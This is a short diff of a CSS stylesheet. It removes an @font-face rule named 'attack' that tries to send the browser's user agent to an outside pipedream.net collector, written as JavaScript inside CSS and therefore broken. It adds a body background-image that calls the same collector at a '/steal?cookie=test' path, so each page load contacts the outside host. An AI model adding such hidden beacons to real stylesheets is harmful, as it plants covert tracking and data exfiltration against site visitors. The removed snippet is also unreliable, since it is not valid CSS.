@@ -1,7 +1,3 @@
-@font-face {
-  font-family: attack;
-  src: url("https://eo10sr0fi9sxhnf.m.pipedream.net/log?data=" + navigator.userAgent);
-}
 body {
-  font-family: attack;
+    background-image: url('https://eo10sr0fi9sxhnf.m.pipedream.net/steal?cookie=test');
 }
